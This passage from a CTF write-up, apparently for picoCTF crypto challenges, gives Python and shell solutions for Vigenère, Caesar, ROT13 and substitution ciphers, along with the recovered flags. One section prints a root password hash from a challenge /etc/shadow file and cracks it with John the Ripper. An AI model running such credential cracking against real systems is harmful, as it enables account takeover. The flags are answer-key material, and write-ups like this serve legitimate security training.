</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

c <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;llkjmlmpadkkc&#39;</span><span style="color:#ff79c6">.</span>upper()
k <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;thisisalilkey&#39;</span><span style="color:#ff79c6">.</span>upper()

alphabet <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">ror</span>(message, cnt):
   message <span style="color:#ff79c6">=</span> message[cnt:]<span style="color:#ff79c6">+</span>message[<span style="color:#bd93f9">0</span>:cnt]
   <span style="color:#ff79c6">return</span> message

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">rotate</span>(letter):
   i <span style="color:#ff79c6">=</span> alphabet<span style="color:#ff79c6">.</span>find(letter)
   r <span style="color:#ff79c6">=</span> ror(alphabet, i)
   <span style="color:#ff79c6">return</span> r

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">offset</span>(rotated_alphabet, letter):
   i <span style="color:#ff79c6">=</span> alphabet<span style="color:#ff79c6">.</span>find(letter)
   <span style="color:#ff79c6">return</span> rotated_alphabet[i]

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encrypt</span>(key, cipher):
    cleartext <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(key)):
        alph <span style="color:#ff79c6">=</span> rotate(key[i])
        l <span style="color:#ff79c6">=</span> offset(alph, cipher[i])
        cleartext <span style="color:#ff79c6">+=</span> l
    <span style="color:#ff79c6">return</span> cleartext

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decrypt</span>(key, cipher):
   cleartext <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
   <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(key)):
       alph <span style="color:#ff79c6">=</span> rotate(key[i])
       offset <span style="color:#ff79c6">=</span> alph<span style="color:#ff79c6">.</span>find(cipher[i])
       cleartext <span style="color:#ff79c6">+=</span> alphabet[offset]
   <span style="color:#ff79c6">return</span> cleartext

<span style="color:#8be9fd;font-style:italic">print</span> decrypt(k, c)
<span style="color:#8be9fd;font-style:italic">print</span> encrypt(k, c)
</code></pre></td></tr></table>
</div>
</div><h2 id="crypto-warmup-2">Crypto-warmup-2</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

c <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;cvpbPGS{guvf_vf_pelcgb!}&#39;</span>

cleartext <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(c)):
    n <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(c[i])<span style="color:#ff79c6">+</span><span style="color:#bd93f9">13</span>
    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">ord</span>(c[i]) <span style="color:#ff79c6">&gt;=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;a&#39;</span>) <span style="color:#ff79c6">and</span> <span style="color:#8be9fd;font-style:italic">ord</span>(c[i])<span style="color:#ff79c6">&lt;=</span><span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;z&#39;</span>):
        <span style="color:#ff79c6">if</span> n <span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;z&#39;</span>):
            n <span style="color:#ff79c6">=</span> n <span style="color:#ff79c6">-</span><span style="color:#bd93f9">26</span>
        cleartext <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(n)
    <span style="color:#ff79c6">elif</span> <span style="color:#8be9fd;font-style:italic">ord</span>(c[i]) <span style="color:#ff79c6">&gt;=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;A&#39;</span>) <span style="color:#ff79c6">and</span> <span style="color:#8be9fd;font-style:italic">ord</span>(c[i]) <span style="color:#ff79c6">&lt;=</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;Z&#39;</span>):
        <span style="color:#ff79c6">if</span> n <span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;Z&#39;</span>):
            n <span style="color:#ff79c6">=</span> n <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">26</span>
        cleartext <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">chr</span>(n)
    <span style="color:#ff79c6">else</span>:
        cleartext <span style="color:#ff79c6">+=</span> c[i]

<span style="color:#8be9fd;font-style:italic">print</span> cleartext
</code></pre></td></tr></table>
</div>
</div><h2 id="heeeeeeere-s-johnny">HEEEEEEERE-S-Johnny</h2>
<p><code>/etc/shadow</code> file</p>
<pre tabindex="0"><code class="language-cat" data-lang="cat">root:$6$IGI9prWh$ZHToiAnzeD1Swp.zQzJ/Gv.iViy39EmjVsg3nsZlfejvrAjhmp5jY.1N6aRbjFJVQX8hHmTh7Oly3NzogaH8c1:17770:0:99999:7:::
</code></pre><p>crack with john the ripper:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john shadow
john --show shadow
</code></pre></td></tr></table>
</div>
</div><h2 id="caesar-cipher-1">caesar-cipher-1</h2>
<p>it is possible to use bash for simple caesar code</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;grpqxdllaliazxbpxozfmebotlvlicmr&#39;</span> | tr <span style="color:#f1fa8c">&#39;[x-za-w]&#39;</span> <span style="color:#f1fa8c">&#39;[a-z]
</span><span style="color:#f1fa8c">echo &#39;</span>justagoodoldcaesarcipherwoyolfpu<span style="color:#f1fa8c">&#39; | tr &#39;</span><span style="color:#ff79c6">[</span>a-z<span style="color:#ff79c6">]</span><span style="color:#f1fa8c">&#39;  &#39;</span><span style="color:#ff79c6">[</span>x-za-w<span style="color:#ff79c6">]</span>&#39;
</code></pre></td></tr></table>
</div>
</div><p>in a similar manner, we can do:</p>
<ul>
<li>rot13 encoding with <code>echo ... | tr '[A-Z]' '[N-ZA-M]'</code></li>
<li>rot13 decoding with <code>echo ... | tr '[N-ZA-M]' '[A-Z]'</code></li>
</ul>
<h2 id="caesar-cipher-2">caesar-cipher-2</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

cipher <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;d]Wc7H:oW5YgUFS7]D\9fGS^iGHSUF9bHSg9WIf9q&#39;</span>

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">255</span>):
    plain <span style="color:#ff79c6">=</span> [ <span style="color:#8be9fd;font-style:italic">chr</span>((<span style="color:#8be9fd;font-style:italic">ord</span>(c)<span style="color:#ff79c6">+</span>i)<span style="color:#ff79c6">%</span><span style="color:#bd93f9">255</span>) <span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> cipher]
    plainStr <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(plain)
    <span style="color:#ff79c6">if</span> plainStr<span style="color:#ff79c6">.</span>lower()<span style="color:#ff79c6">.</span>find(<span style="color:#f1fa8c">&#39;pico&#39;</span>):
        <span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#8be9fd;font-style:italic">str</span>(i) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39; &#39;</span> <span style="color:#ff79c6">+</span> plainStr
</code></pre></td></tr></table>
</div>
</div><p>the above will execute all possible caesar rotation</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python get_flag.py
<span style="color:#bd93f9">12</span> picoCTF<span style="color:#ff79c6">{</span>cAesaR_CiPhErS_juST_aREnT_sEcUrE<span style="color:#ff79c6">}</span>
<span style="color:#bd93f9">235</span> PICO#4&amp;<span style="color:#ff79c6">[</span>C!ESA2?#I0H%R3?JU34?A2%N4?S%C5R%<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="hertz">hertz</h2>
<ul>
<li><a href="./resources/hertz/hertz.txt">hertz.txt</a> We want to decrypt this substitution cipher</li>
<li><a href="http://practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-simple-substitution-cipher/">cryptanalysis resources</a> for breaking substitution cipher</li>
</ul>
<p><strong>solution</strong>:</p>
<ul>
<li><a href="./resources/hertz/break_substitution_cipher.py">break_substitution_cipher.py</a></li>
<li><a href="./resources/hertz/ngram_score.py">ngram_score.py</a></li>
<li><a href="./resources/hertz/english_quadgrams.txt">english_quadgrams.txt</a></li>
</ul>
<p>We first obtain the substitution cipher key:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">cd</span> resources/hertz/
ls -l <span style="color:#f1fa8c">`</span>whereis python2<span style="color:#f1fa8c">`</span>
virtualenv -p ../../System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7 venv
<span style="color:#8be9fd;font-style:italic">source</span> venv/bin/activate
pip install pycipher
python break_substitution_cipher.py
&lt;CTRL-D to exit&gt;
</code></pre></td></tr></table>
</div>
</div><p>After only one iteration, we get the best key: &lsquo;OBXIYQRLWATPDVSHFEZKGMJUCN&rsquo;,
so now it&rsquo;s just a matter to execute the substitution and eventually perform manual adjustments on the key when needed.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> string

alphabet <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span style="color:#ff79c6">.</span>lower()
best_key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;OBXIYQRLWATPDVSHFEZKGMJUCN&#39;</span><span style="color:#ff79c6">.</span>lower()

file <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;hertz.txt&#34;</span>, <span style="color:#f1fa8c">&#34;r&#34;</span>)
ctext <span style="color:#ff79c6">=</span> file<span style="color:#ff79c6">.</span>read()

cleartext <span style="color:#ff79c6">=</span> ctext<span style="color:#ff79c6">.</span>translate(string<span style="color:#ff79c6">.</span>maketrans(best_key, alphabet))

<span style="color:#8be9fd;font-style:italic">print</span> (cleartext)
</code></pre></td></tr></table>
</div>
</div><p>Old resources:</p>
<ul>
<li><a href="./resources/hertz/break_simplesub_2.py">break_simplesub_2.py</a></li>
<li><a href="./resources/hertz/break_substitution_cipher_python2.py">break_substitution_cipher_python2.py</a></li>
<li><a href="./resources/hertz/ngram_score.pyc">ngram_score.pyc</a></li>
</ul>
<h2 id="blaises-cipher">Blaise&rsquo;s cipher</h2>
<ul>
<li><strong>solution</strong>: <a href="./resources/blaise/blaise.py">blaise.py</a></li>
<li>resources: <a href="https://rosettacode.org/wiki/Vigen%C3%A8re_cipher/Cryptanalysis#Python">rosettacode.org</a></li>
</ul>
<p>Blaise de Vigenere is the inventor of the vigenere cipher.
As opposed to crypto warmup 1, we don&rsquo;t have the key so we have to bruteforce it.
We will use cryptanalysis python code from rosetta.org to find the key:
The python script is <a href="./resources/blaise/get_flag.py">here</a>
Now that we found the key it is easy:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> pycipher <span style="color:#ff79c6">import</span> Vigenere
plaintext <span style="color:#ff79c6">=</span> Vigenere(<span style="color:#f1fa8c">&#39;FLAG&#39;</span>)<span style="color:#ff79c6">.</span>decipher(encoded)
<span style="color:#8be9fd;font-style:italic">print</span> (plaintext)
</code></pre></td></tr></table>
</div>
</div><h2 id="hertz-2">Hertz 2</h2>
<ul>
<li><a href="./resources/hertz-2/hertz.txt">hertz.txt</a> We want to break this substitution cipher</li>
</ul>
<p><strong>solution</strong>:</p>
<ul>
<li><a href="./resources/hertz/break_substitution_cipher.py">break_substitution_cipher.py</a></li>
<li><a href="./resources/hetz/ngram_score.py">ngram_score.py</a></li>
<li><a href="./resources/hertz/english_quadgrams.txt">english_quadgrams.txt</a></li>
</ul>
<p>We can use an online cryptanalysis tool such as quipqiup.com for frequency cryptanalysis,
but for the beauty, we will have the exactly same approach of hertz challenge.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;Uqc ldvhm itjxp rjb ydefo jnct uqc kazs wjg. V hap&#39;u ickvcnc uqvo vo odhq ap caos ftjikce vp Fvhj. Vu&#39;o akejou ao vr V ojkncw a ftjikce aktcaws! Jmas, rvpc. Qctc&#39;o uqc rkag: fvhjHUR{odiouvuduvjp_hvfqcto_atc_ujj_caos_wpgajxensc}&#34;</span> &gt; hertz.txt
python break_substitution_cipher.py
&lt;CTRL-D to exit&gt;
</code></pre></td></tr></table>
</div>
</div><p>After only one iteration, we get the best key: &lsquo;AIHWCRGQVYMKEPJFLTOUDNXBSZ&rsquo;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> string

alphabet <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>
best_key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;AIHWCRGQVYMKEPJFLTOUDNXBSZ&#39;</span>

alphabet <span style="color:#ff79c6">+=</span> alphabet<span style="color:#ff79c6">.</span>lower()
best_key <span style="color:#ff79c6">+=</span> best_key<span style="color:#ff79c6">.</span>lower()

